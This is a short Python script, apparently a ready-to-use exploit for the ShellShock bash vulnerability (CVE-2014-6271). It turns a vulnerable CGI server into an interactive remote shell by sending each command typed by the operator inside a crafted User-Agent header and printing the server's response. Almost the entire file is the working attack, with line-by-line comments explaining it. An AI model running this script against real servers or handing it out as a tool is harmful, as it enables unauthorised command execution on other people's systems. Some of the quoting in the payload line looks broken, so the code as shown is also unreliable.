#!/usr/bin/python
# CVE-2014-6271 - ShellShock
import sys, urllib2    # Import the required modules for the vulnerability
 
if len(sys.argv) != 2:    # Checks to be sure that a URL was supplied as a sys argument "<script> <URL>"
  print "Usage: "+sys.argv[0]+" <URL>"
  sys.exit(0)
 
URL=sys.argv[1]        # Assigns URL variable and prints out message
print "[+] Attempting Shell_Shock - Make sure to type full path"
 
while True:        # Endless loop printing out a "~$ " and getting user input via "raw_input" to the command variable
  command=raw_input("~$ ")
  opener=urllib2.build_opener()        # Modifying the default request to include the attack string via User-Agent
  opener.addheaders=[('User-agent', '() { foo;}; echo Content-Type: text/plain ; echo ' /bin/bash -c "'+command+'"')]
  try:                    # Sets up a Try/Except loop so exceptions are handled cleanly
    response=opener.open(URL)    # Sends request and prints the response
    for line in response.readlines():
      print line.strip()
  except Exception as e: print e